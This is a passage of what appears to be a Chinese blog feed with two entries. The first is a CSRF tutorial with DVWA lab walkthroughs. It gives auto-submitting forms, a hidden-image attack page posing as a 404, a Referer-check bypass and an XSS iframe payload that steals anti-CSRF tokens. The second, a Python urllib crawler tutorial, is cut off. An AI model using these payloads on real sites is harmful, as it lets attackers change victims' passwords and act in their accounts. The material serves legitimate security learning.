        <content type="html"><![CDATA[<p><strong>本文首发于先知社区</strong></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>闲来无事，开启了CSRF与SSRF漏洞的学习之旅。为什么要放一起学习呢？因为两者比较像，都是请求伪造。CSRF跨站请求伪造，SSRF服务器请求伪造。</p><h3 id="0x01-CSRF漏洞简介"><a href="#0x01-CSRF漏洞简介" class="headerlink" title="0x01 CSRF漏洞简介"></a>0x01 CSRF漏洞简介</h3><p>对web客户端的攻击，除了XSS以外，还有一个非常重要的漏洞就是CSRF。<br>CSRF最关键的是利用受害者的Cookie向服务器发送伪造请求。<br><strong>1.CSRF漏洞概念</strong><br>CSRF（Cross-site request forgery，跨站请求伪造），也被称为“One Click Attack”或Session Riding，通常缩写为CSRF或者XSRF，是基于客户端操作的请求伪造，是一种对网站的恶意利用。<br><strong>2.CSRF与XSS的区别</strong><br>CSRF听起来像跨站脚本攻击(XSS)，但与XSS不同。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。<br>什么意思呢？我的理解就是：<br>XSS利用的是用户对指定网站的信任，CSRF利用是网站对用户浏览器的信任。<br><strong>3.CSRF漏洞原理</strong><br>学习过程中，参考了一下大师傅的博客，发现CSRF原理可以分为狭义的CSRF和广义的CSRF</p><ul><li>狭义的CSRF：是指在攻击者已经将代码植入受害用户的浏览器访问的页面的前提下，以“受害用户”的身份向服务端发起一个伪造的http请求，从而实现服务器<a href="https://baike.so.com/doc/1102143-1166199.html" target="_blank" rel="noopener">CURD</a>来执行读写操作。</li><li>广义的CSRF：<br>就是攻击者将一个http接口中需要传递的所有参数都预测出来，然后不管以什么方式，都可以来任意调用你的接口，对服务器实现CURD</li></ul><p><strong>4.CSRF攻击流程</strong><br><img src="http://img-blog.csdnimg.cn/20200225224153721.jpg" alt="在这里插入图片描述"></p><ol><li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站bA；</li><li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li><li>用户未退出网站A之前，在同一浏览器中，打开一个标签页访问恶意网站B；</li><li>恶意网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求访问第三方站点A；</li><li>浏览器在接收到这些攻击性代码后，根据恶意网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自恶意网站B的恶意代码被执行。</li></ol><p><strong>5.CSRF攻击实现的条件</strong></p><ul><li>登录受信任站点WebA，并在本地生成Cookie。</li><li>在不登出WebA的情况下，访问站点WebB。</li></ul><h3 id="0x02-常见CSRF攻击类型"><a href="#0x02-常见CSRF攻击类型" class="headerlink" title="0x02 常见CSRF攻击类型"></a>0x02 常见CSRF攻击类型</h3><p>常见CSRF攻击类型有：GET型CSRF、POST型CSRF<br>下面使用必火团队的CSRF在线靶场进行验证。<a href="https://www.nanhack.com/payload/xss/csrf1.php" target="_blank" rel="noopener">靶场地址</a><br><strong>GET型</strong><br>仅需要一个HTTP请求。就能够构造一次简单的CSRF。<br><img src="http://img-blog.csdnimg.cn/2020022521515875.jpg" alt="在这里插入图片描述"></p><pre><code class="php">银行站点,正常GET请求来完毕银行转账给admin的10元操作：http://www.nanhack.com/payload/xss/csrf1.php?name=admin&amp;money=10恶意攻击者页面：http://www.nanhack.com/payload/xss/csrf1.php访问恶意攻击者页面产生CSRF请求：http://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000</code></pre><p>用户登录了银行站点，然后访问恶意攻击者页面，这时qwzf的银行账户少了1000。<br><img src="http://img-blog.csdnimg.cn/20200225221415859.jpg" alt="在这里插入图片描述"><br>原因：银行站点A违反了HTTP规范，使用GET请求更新资源。<br>用户在访问恶意攻击者页面之前，已经登录了银行站点，而攻击者页面中的 一个合法的请求，但这里被不法分子利用了。<br>浏览器会带上银行站点的Cookie发出Get请求，去获取资源以GET的方式请求第三方资源（这里的第三方就是指银行站点了，这里是<code>https://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000</code> ，结果银行站点服务器收到请求后，认为这是一个更新资源操作(转账操作)，所以就立马进行转账操作。从而qwzf的银行账户转账给zsm账户1000元。<br>直接构造CSRF链接，隐蔽性太低。于是可以采用标签等方法进行隐藏。<br><em>4种GET型CSRF构造方式</em></p><ol><li>链接利用(a标签)</li><li>iframe利用<br>可以设置iframe的style为display:none，以此来不显示iframe加载的内容</li><li>img标签利用<br>img标签内的内容会随着页面加载而被请求，以此src指向的位置会在页面加载过程中进行请求</li><li>background利用<br>可以利用CSS中background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求</li></ol><p><strong>POST型</strong><br>危害没有GET型的大，利用通常使用的是一个自动提交的表单。如：</p><pre><code class="html">&lt;form name=&quot;csrf&quot; action=&quot;http://edu.xss.tv/payload/xss/csrf2.php&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;zhangsan&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt;document.csrf.submit();&lt;/script&gt;</code></pre><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p><h3 id="0x03-CSRF漏洞探测"><a href="#0x03-CSRF漏洞探测" class="headerlink" title="0x03 CSRF漏洞探测"></a>0x03 CSRF漏洞探测</h3><p>利用自动化探测工具<code>CSRFTester</code>或者burp自带<code>CSRF POC</code><br>1.CSRFTester设置浏览器代理:127.0.0.1:8008，burp是8080<br>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞<br>3.生成CSRF的POC<br>参考：<a href="https://xz.aliyun.com/t/6128#toc-7" target="_blank" rel="noopener">Web安全Day3 - CSRF实战攻防</a></p><h3 id="0x04-CSRF漏洞防御"><a href="#0x04-CSRF漏洞防御" class="headerlink" title="0x04 CSRF漏洞防御"></a>0x04 CSRF漏洞防御</h3><ul><li>设置和判断cookie时采用hash值认证。</li><li>尽量采用post类型传参，这就减少了请求被直接伪造的可能。</li><li>验证HTTP Referer字段</li><li>在 HTTP 头中自定义属性并验证</li><li>在请求地址中添加token并验证</li><li>采用验证码判断，进行防御。</li></ul><h3 id="0x05-DVWA靶场CSRF练习"><a href="#0x05-DVWA靶场CSRF练习" class="headerlink" title="0x05 DVWA靶场CSRF练习"></a>0x05 DVWA靶场CSRF练习</h3><p>首先，先登录DVWA，以在浏览器上保存Cookie信息。用户名：admin   密码：password</p><h4 id="1-Low级"><a href="#1-Low级" class="headerlink" title="1.Low级"></a>1.Low级</h4><p>查看下源码(这里只写一些关键代码)：</p><pre><code class="php">&lt;?php   if (isset($_GET[&#39;Change&#39;])) {    //获取两次密码输入    $pass_new = $_GET[&#39;password_new&#39;];       $pass_conf = $_GET[&#39;password_conf&#39;];    if (($pass_new == $pass_conf)){           $pass_new = mysql_real_escape_string($pass_new); //过滤字符串        $pass_new = md5($pass_new);        $insert=&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;admin&#39;;&quot;;           $result=mysql_query($insert) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );                echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;                   mysql_close();       }     else{                   echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;                   } }   ?&gt;</code></pre><p>首先获取输入的两个密码然后判断两个值是否相等，若相等则接着对<code>pass_new</code>变量进行调用<code>mysql_real_escape_string()</code>函数来进行字符串的过滤、再调用md5()函数对输入的密码进行MD5加密，最后再将新密码更新到数据库中。整段代码因为调用了<code>mysql_real_escape_string()</code>函数从而有效地过滤了SQL注入，但是对CSRF没有任何的防御机制。(当然服务器对请求的发送者是做了身份验证的，检查Cookie，只是这里代码没有体现)</p><h4 id="Low级漏洞利用"><a href="#Low级漏洞利用" class="headerlink" title="Low级漏洞利用"></a>Low级漏洞利用</h4><p>正常修改密码：</p><pre><code class="php">http://192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code></pre><p><strong>（1）直接构造链接</strong></p><pre><code class="php">http://192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=qwzf&amp;password_conf=qwzf&amp;Change=Change#</code></pre><p>当受害者点击这个链接，他的密码就会被改成qwzf（这种构造一眼就能看出来是改密码，隐蔽性太低）<br><img src="http://img-blog.csdnimg.cn/20200225233601119.jpg" alt="在这里插入图片描述"><br><strong>（2）使用短链接来隐藏URL</strong><br>生成短链接常用网址：<br><a href="http://tool.chinaz.com/tools/dwz.aspx" target="_blank" rel="noopener">站长工具</a><br><a href="http://dwz.cn/" target="_blank" rel="noopener">百度短网址</a><br><img src="http://img-blog.csdnimg.cn/20200225234942917.jpg" alt="在这里插入图片描述"><br>点击短链接，会自动跳转到真实网站。在实际攻击场景下只要目标服务器的域名不是ip，并且是远程服务器。<br><strong>（3）构造攻击页面</strong><br>通过img标签中的src属性来加载CSRF攻击利用的URL，并进行布局隐藏，然后在公网上传下面这个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里我写一个qwzf.html：</p><pre><code class="html">&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;img src=&quot;http://192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=qwzf&amp;password_conf=qwzf&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;p&gt;The requested URL /qwzf.html was not found on this server.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>当用户访问qwzf.html时，会误认为是自己访问一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了qwzf。<br><img src="http://img-blog.csdnimg.cn/20200227014423206.jpg" alt="在这里插入图片描述"></p><h4 id="2-Medium级"><a href="#2-Medium级" class="headerlink" title="2.Medium级"></a>2.Medium级</h4><p>查看源码发现，比Low级多了个if判断</p><pre><code class="php">if( isset( $_GET[ &#39;Change&#39; ] ) ) {     // Checks to see where the request came from     if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) ) { </code></pre><p><code>eregi(string pattern, string string)</code><br>检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。<br>同时可以看到，Medium级的代码检查了保留变量 <code>HTTP_REFERER</code>(http包头的Referer参数的值，表示来源地址）中是否包含<code>SERVER_NAME</code>(http包头的Host参数，及要访问的主机名，这里是192.168.1.3)，希望通过这种机制抵御CSRF攻击。</p><h4 id="Medium级漏洞利用"><a href="#Medium级漏洞利用" class="headerlink" title="Medium级漏洞利用"></a>Medium级漏洞利用</h4><p>将之前<code>qwzf.html</code>攻击页面命名为<code>192.168.1.3.html</code>，然后放置在攻击者的服务器里，这里是<code>http://39.x.93.165:8080/</code><br><img src="http://img-blog.csdnimg.cn/20200227014738196.jpg" alt="在这里插入图片描述"><br>Referer参数绕过过滤规则<br><img src="http://img-blog.csdnimg.cn/2020022600351295.jpg" alt="在这里插入图片描述"><br>密码被修改为了qwzf</p><h4 id="3-High级"><a href="#3-High级" class="headerlink" title="3.High级"></a>3.High级</h4><p>查看源码发现，比Low级多了随机token</p><pre><code class="php">if( isset( $_GET[ &#39;Change&#39; ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );     ......}// Generate Anti-CSRF token generateSessionToken(); </code></pre><p>High级的代码加入了Anti-CSRF token机制，即用户每次访问改密页面时，服务器会返回一个<code>随机的token</code>。<br>向服务器发起请求时，需要提交token参数。<br>而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p><code>暴力破解可以突破CSRF Token</code><br>原因：构造HTTP请求的对象不一样。暴力破解，攻击者是当前用户，受害者是其他用户。CSRF攻击者是其他用户，受害者是当前用户。</p><h4 id="High级漏洞利用"><a href="#High级漏洞利用" class="headerlink" title="High级漏洞利用"></a>High级漏洞利用</h4><p>绕过反CSRF机制，关键是要<code>获取token</code>，要利用受害者的cookie去修改密码的页面获取关键的token。<br>可不可以在自己的恶意页面中运行js脚本而取得目标页面的token呢？当然是不可以，浏览器普遍对跨域请求资源有访问控制。对于需要验证的资源，跨域请求会被拒绝。<br>但是如果同时存在存储xss漏洞的话，可进行csrf利用。<br>（1）首先我们需要先获取用户token，由于现在都已经不支持跨域请求访问了，所以只能从别的地方入手获取token，查看大师傅博客，发现可以利用下面的脚本在XSS(Stored)的Name参数进行XSS攻击，获取用户token：</p><pre><code class="php">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/2020022702394473.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200227024318123.jpg" alt="在这里插入图片描述"><br>（2）然后将下面的脚本构造攻击页面放到攻击服务器上，诱导用户点击，从而实现攻击<br>csrf.html</p><pre><code class="html">&lt;script type=&quot;text/javascript&quot;&gt;    function attack()    {        document.getElementById(&quot;transfer&quot;).submit();     }&lt;/script&gt;&lt;body οnlοad=&quot;attack()&quot;&gt;    &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.1.3/dvwa/vulnerabilities/csrf&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;qwzf&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;qwzf&quot;&gt;        &lt;input type=&#39;hidden&#39; name=&#39;user_token&#39; value=&quot;8519d07c0e08e8ef0461311e9a880af5&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;    &lt;/form&gt;&lt;/body&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200227025241280.jpg" alt="在这里插入图片描述"><br>另外high级还有一种大师傅发现的方法，参考大师傅博客：<br><a href="https://www.sohu.com/a/314777870_354899" target="_blank" rel="noopener">DVWA 1.10 High等级的CSRF另类通关法 </a></p><h3 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h3><p>通过学习CSRF漏洞，感觉Web安全竟如此有趣，继续加油！！！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> CSRF漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
            <tag> 攻击类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习-网络爬虫(一)</title>
      <link href="/2020/02/20/Python%E5%AD%A6%E4%B9%A0-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB(%E4%B8%80)/"/>
      <url>/2020/02/20/Python%E5%AD%A6%E4%B9%A0-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>一直都听说过网络爬虫，网络爬虫到底是什么？带着这个问题，我开始学习编写网络爬虫。下面记录了我学习过程中遇到的网络爬虫相关知识：</p><h3 id="0x01-爬虫基本原理"><a href="#0x01-爬虫基本原理" class="headerlink" title="0x01 爬虫基本原理"></a>0x01 爬虫基本原理</h3><h4 id="1、爬虫概述"><a href="#1、爬虫概述" class="headerlink" title="1、爬虫概述"></a>1、爬虫概述</h4><p> <strong>1.1 网络爬虫是什么？</strong><br>网络爬虫是请求网站并提取数据的自动化程序。<br>网络爬虫有很多类型，常用的有通用网络爬虫、聚焦网络爬虫等。<br> <strong>1.2 爬虫基本流程</strong></p><ol><li>发起请求：通过HTTP库向目标站点发起请求，即发送一个Request,请求可以包含额外的headers等信息，等待服务器响应。</li><li>获取响应内容：如果服务器能正常响应，会得到一个Response,Response的内容便是所要获取的页面内容，类型可能有HTML, Json字符串，二进制数据(如图片视频)等类型。</li><li>解析内容：得到的内容可能是HTML，可以用正则表达式、网页解析库进行解析。可能是Json, 可以直接转为Json对象解析，可能是二进制数据，可以做保存或者进一步的处理。</li><li>保存数据：保存形式多样，可以存为文本，也可以保存至数据库，或者保存特定格式的文件。</li></ol><p><strong>1.3 能抓取怎样的数据？</strong></p><ol><li>网页文本：如HTML文档、Json格式文本等。</li><li>图片：获取到的是二进制文件，保存为图片格式。</li><li>视频：同为二进制文件，保存为视频格式即可。</li><li>其他：只要是能请求到的，都能获取。<h4 id="2、爬虫基本流程的实现"><a href="#2、爬虫基本流程的实现" class="headerlink" title="2、爬虫基本流程的实现"></a>2、爬虫基本流程的实现</h4></li></ol><p><strong>2.1 Request</strong></p><ol><li>请求方式：主要有GET、POST两种类型，另外还有HEAD、PUT、DELETE、OPTIONS等。</li><li>请求URL：URL全称统一资源定位符， 如一个网页文档、一张图片、一个视频等都可以用URL唯一来确定。</li><li>请求头：包含请求时的头部信息，如User-Agent、 Host、Cookies等信息。</li><li>请求体：请求时额外携带的数据如表单提交时的表单数据。</li></ol><p><strong>2.2 Response</strong></p><ol><li>响应状态：有多种响应状态，如200代表成功、301跳转、404找不到页面、502服务器错误等。</li><li>响应头：如内容类型、内容长度、服务器信息、设置Cookie等等。</li><li>响应体：最主要的部分，包含了请求资源的内容，如网页HTML、图片二进制数据等。</li></ol><p><strong>2.3.1 怎样来解析？(解析方式)</strong></p><ol><li>直接处理</li><li>Json解析</li><li>正则表达式</li><li>解析库(BeautifulSoup、PyQuery、Xpath)</li></ol><p><strong>2.3.2 怎样解决JavaScript渲染的问题？</strong></p><ol><li>分析Ajax请求</li><li>Selenium/WebDriver</li><li>Splash</li><li>PyV8、Ghost.py</li></ol><p><strong>2.4 怎样保存数据？</strong></p><ol><li>文本：纯文本、Json、Xml等。</li><li>关系型数据库：如MySQL、Oracle、SQL Server等具有结构化表结构形式存储。</li><li>非关系型数据库：如MongoDB、Redis等Key-Value形式存储。</li><li>二进制文件：如图片、视频、音频等等直接保存成特定格式即可。</li></ol><h3 id="0x02-Python爬虫常用库"><a href="#0x02-Python爬虫常用库" class="headerlink" title="0x02 Python爬虫常用库"></a>0x02 Python爬虫常用库</h3><h4 id="1-1-urllib"><a href="#1-1-urllib" class="headerlink" title="1.1 urllib"></a>1.1 urllib</h4><p>Python 内置的 HTTP 请求库，也就是说不需要额外安装即可使用。</p><ul><li><strong>urllib.request</strong>：请求模块，它是最基本的 HTTP 请求模块，可以用来模拟发送请求。</li><li><strong>urllib.error</strong>：异常处理模块，如果出现请求错误，我们可以捕获这些异常，然后进行重试或其他操作以保证程序不会意外终止。</li><li><strong>urllib.parse</strong>：url解析模块，提供了许多 URL 处理方法，比如拆分、解析、合并等。</li><li><strong>urllib.robotparser</strong>：robots.txt解析模块，主要是用来识别网站的 robots.txt 文件，然后判断哪些网站可以爬，哪些网站不可以爬，用得比较少。</li></ul><p>与Python2相比的变化</p><pre><code class="py">Pythonimport urllib2response = urllib.urlopen(&#39;http://www.baidu.com&#39;)Python3import urllib.requestresponse = urllib.request.urlopen(&#39;http://www.baidu.com&#39;)</code></pre><h4 id="1-2-urllib基础操作"><a href="#1-2-urllib基础操作" class="headerlink" title="1.2 urllib基础操作"></a>1.2 urllib基础操作</h4><p><strong>1.2.1 urlopen</strong></p><pre><code class="python">urllib.request.urlopen(url,data=None,[timeout,]*,cafile=None,capath=None,cadefault=False,context=None)</code></pre><pre><code class="python">get类型：import urllib.requestresponse = urllib.request.urlopen(&#39;http://httpbin.org/get&#39;)print(response.read().decode(&#39;utf-8&#39;))post类型：import urllib.parseimport urllib.requestdata = bytes(urllib.parse.urlencode({&#39;word&#39;:&#39;hello&#39;}),encoding=&#39;utf8&#39;)response = urllib.request.urlopen(&#39;http://httpbin.org/post&#39;,data=data)print(response.read())超时设置：import socketimport urllib.requestimport urllib.errortry:    response = urllib.request.urlopen(&#39;http://httpbin.org/get&#39;,timeout=0.1)except urllib.error.URLError as e:    if isinstance(e.reason,socket.timeout):        print(&#39;time out!&#39;)</code></pre><p><strong>1.2.2 响应</strong><br>响应类型、状态码、响应头、响应内容：</p><pre><code class="python">import urllib.requestresponse = urllib.request.urlopen(&#39;http://www.baidu.com&#39;)print(type(response)) #响应类型print(response.status) #状态码print(response.getheaders()) #响应头print(response.getheader(&#39;Server&#39;)) #获取特定响应头print(response.read().decode(&#39;utf-8&#39;) #响应内容</code></pre><p><strong>1.2.3 Request</strong></p><pre><code class="python">urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None)</code></pre><blockquote><p>url 用于请求 URL，这是必传参数，其他都是可选参数。<br>data 如果要传，必须传 bytes（字节流）类型的。如果是字典，可以先用urllib.parse模块里的 urlencode()编码。<br>headers 是一个字典，它就是请求头，在构造请求时通过headers参数直接构造，也可以通过调用请求实例的 add_header()方法添加。<br>添加请求头最常用的是通过修改User-Agent来伪装浏览器，默认的 User-Agent是 Python-urllib，我们可以通过修改它来伪装浏览器。比如要伪装火狐浏览器，你可以把它设置为：<br>Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11<br>origin_req_host 指的是请求方的 host 名称或者 IP 地址。<br>unverifiable 表示这个请求是否是无法验证的，默认是 False，意思就是说用户没有足够权限来选择接收这个请求的结果。例如，我们请求一个 HTML 文档中的图片，但是我们没有自动抓取图像的权限，这时 unverifiable 的值就是 True。<br>method 是一个字符串，用来指示请求使用的方法，比如 GET、POST 和 PUT 等。</p></blockquote><pre><code class="python">get类型：import urllib.requestrequest = urllib.request.Request(&#39;http://httpbin.org/get&#39;)response = urllib.request.urlopen(request)print(response.read().decode(&#39;utf-8&#39;))post类型：from urllib import request,parseurl = &#39;http://httpbin.org/post&#39;headers = {    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0&#39;,    &#39;Host&#39;:&#39;httpbin.org&#39;}dict = {    &#39;name&#39;:&#39;qwzf&#39;}data = bytes(parse.urlencode(dict),encoding=&#39;utf8&#39;)req = request.Request(url=url,data=data,headers=headers,method=&#39;POST&#39;)response = request.urlopen(req)print(response.read().decode(&#39;utf-8&#39;))另一种post：from urllib import request,parseurl = &#39;http://httpbin.org/post&#39;dict = {    &#39;name&#39;:&#39;qwzf&#39;}data = bytes(parse.urlencode(dict),encoding=&#39;utf8&#39;)req = request.Request(url=url,data=data,method=&#39;POST&#39;)req.add_header(&#39;User-Agent&#39;,&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)&#39;)response = request.urlopen(req)print(response.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="1-3-urllib高级操作"><a href="#1-3-urllib高级操作" class="headerlink" title="1.3 urllib高级操作"></a>1.3 urllib高级操作</h4><p><strong>1.3.1 Handler</strong><br><em>（1）代理</em><br>代理之前<br><img src="http://img-blog.csdnimg.cn/20200216023828228.jpg" alt="在这里插入图片描述"><br>打开控制面板-&gt;网络和 Internet-&gt;Internet选项-&gt;连接-&gt;局域网设置-&gt;代理服务器<br><img src="http://img-blog.csdnimg.cn/20200219002453503.jpg" alt="在这里插入图片描述"><br>看到系统代理端口为10809，然后使用代理软件开启代理服务即可。</p><pre><code class="python">from urllib.error import URLErrorfrom urllib.request import ProxyHandler, build_openerproxy_handler = ProxyHandler({    &#39;http&#39;: &#39;http://127.0.0.1:10809&#39;,    &#39;https&#39;: &#39;https://127.0.0.1:10809&#39;})opener = build_opener(proxy_handler)try:    response = opener.open(&#39;http://httpbin.org/get&#39;)    print(response.read().decode(&#39;utf-8&#39;))except URLError as e:    print(e.reason)</code></pre><p>代理成功<br><img src="http://img-blog.csdnimg.cn/20200216023624659.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200216023640465.jpg" alt="在这里插入图片描述"><br><em>（2）Cookie</em></p><pre><code class="python">#cookie变量被赋值为请求地址的Cookieimport http.cookiejar, urllib.requestcookie = http.cookiejar.CookieJar()                 #声明CookieJar对象handler = urllib.request.HTTPCookieProcessor(cookie)#构建处理Cookieopener = urllib.request.build_opener(handler)       #build_opener传递Cookieresponse = opener.open(&#39;http://www.baidu.com&#39;)for item in cookie:                                 #打印Cookie信息    print(item.name+&quot;=&quot;+item.value)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200218211259509.jpg" alt="在这里插入图片描述"></p><pre><code class="python">#将请求地址的Cookie保存为文本文件import http.cookiejar, urllib.requestfilename = &quot;cookie.txt&quot;                             #将cookie保存成文本文件#声明CookieJar对象的子类对象#cookie = http.cookiejar.MozillaCookieJar(filename)  #声明MozillaCookieJarcookie = http.cookiejar.LWPCookieJar(filename)      #声明LWPCookieJarhandler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&#39;http://www.baidu.com&#39;)cookie.save(ignore_discard=True, ignore_expires=True) #save()方法将Cookie保存成文本文件</code></pre><p><img src="http://img-blog.csdnimg.cn/2020021821172584.jpg" alt="在这里插入图片描述"></p><pre><code class="python">#读取文本文件里存放的Cookie并附着在新的请求地址import http.cookiejar, urllib.requestcookie = http.cookiejar.LWPCookieJar()cookie.load(&#39;cookie.txt&#39;, ignore_discard=True, ignore_expires=True)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&#39;http://www.baidu.com&#39;)print(response.read().decode(&#39;utf-8&#39;))</code></pre><p><strong>1.3.2 异常处理</strong><br>urllib.error异常类型:</p><ul><li>URLError 属性：reason</li><li>HTTPError 属性：code、reason、headers</li><li>ContentTooShortError(msg,content)</li></ul><pre><code class="python">from urllib import request, errortry:    response = request.urlopen(&#39;http://www.httpbin.org/qwzf&#39;)except error.HTTPError as e:    print(e.reason, e.code, e.headers, sep=&#39;\n&#39;)except error.URLError as e:    print(e.reason)else:    print(&#39;Request Successfully&#39;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200218213959656.jpg" alt="在这里插入图片描述"></p><pre><code class="py">import socketimport urllib.requestimport urllib.errortry:    response = urllib.request.urlopen(&#39;https://www.baidu.com&#39;, timeout=0.01)except urllib.error.URLError as e:    print(type(e.reason))    if isinstance(e.reason, socket.timeout):        print(&#39;TIME OUT&#39;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200218214334969.png" alt="在这里插入图片描述"><br><strong>1.3.3 URL解析</strong><br><em>（1）urlparse</em><br>分隔url</p><pre><code class="python">urllib.parse.urlparse(urlstring, scheme=&#39;&#39;, allow_fragments=True)</code></pre><pre><code class="python">#分隔urlfrom urllib.parse import urlparseresult = urlparse(&#39;http://www.baidu.com/index.html;user?id=5#comment&#39;)print(type(result), result)运行结果：&lt;class &#39;urllib.parse.ParseResult&#39;&gt; ParseResult(scheme=&#39;http&#39;, netloc=&#39;www.baidu.com&#39;, path=&#39;/index.html&#39;, params=&#39;user&#39;, query=&#39;id=5&#39;, fragment=&#39;comment&#39;)#指定以https解析from urllib.parse import urlparseresult = urlparse(&#39;www.baidu.com/index.html;user?id=5#comment&#39;, scheme=&#39;https&#39;)print(result)#scheme作为默认，如果url指定解析方式，则scheme不生效from urllib.parse import urlparseresult = urlparse(&#39;http://www.baidu.com/index.html;user?id=5#comment&#39;, scheme=&#39;https&#39;)print(result)from urllib.parse import urlparseresult1 = urlparse(&#39;http://www.baidu.com/index.html;user?id=5#comment&#39;, allow_fragments=False)result2 = urlparse(&#39;http://www.baidu.com/index.html#comment&#39;, allow_fragments=False)print(result1,&#39;\n&#39;,result2)运行结果：ParseResult(scheme=&#39;http&#39;, netloc=&#39;www.baidu.com&#39;, path=&#39;/index.html&#39;, params=&#39;user&#39;, query=&#39;id=5#comment&#39;, fragment=&#39;&#39;) ParseResult(scheme=&#39;http&#39;, netloc=&#39;www.baidu.com&#39;, path=&#39;/index.html#comment&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)</code></pre><p><em>（2）urlunparse</em><br>拼接url</p><pre><code class="python">from urllib.parse import urlunparsedata = [&#39;http&#39;, &#39;www.baidu.com&#39;, &#39;index.html&#39;, &#39;user&#39;, &#39;a=6&#39;, &#39;comment&#39;]print(urlunparse(data))运行结果：http://www.baidu.com/index.html;user?a=6#comment</code></pre><p><em>（3）urljoin</em><br>拼接url</p><pre><code class="python">from urllib.parse import urljoinprint(urljoin(&#39;http://www.baidu.com&#39;, &#39;FAQ.html&#39;))#后边url字段覆盖前面的url字段。#前面有字段不存在，则补充。存在则覆盖print(urljoin(&#39;http://www.baidu.com&#39;, &#39;https://cuiqingcai.com/FAQ.html&#39;))print(urljoin(&#39;http://www.baidu.com/about.html&#39;, &#39;https://cuiqingcai.com/FAQ.html&#39;))print(urljoin(&#39;http://www.baidu.com/about.html&#39;, &#39;https://cuiqingcai.com/FAQ.html?question=2&#39;))print(urljoin(&#39;http://www.baidu.com?wd=abc&#39;, &#39;https://cuiqingcai.com/index.php&#39;))print(urljoin(&#39;http://www.baidu.com&#39;, &#39;?category=2#comment&#39;))print(urljoin(&#39;www.baidu.com&#39;, &#39;?category=2#comment&#39;))print(urljoin(&#39;www.baidu.com#comment&#39;, &#39;?category=2&#39;))</code></pre><p><img src="http://img-blog.csdnimg.cn/20200218220551494.jpg" alt="在这里插入图片描述"><br><em>（4）urlencode</em><br>把字典对象转换成get请求参数</p><pre><code class="python">from urllib.parse import 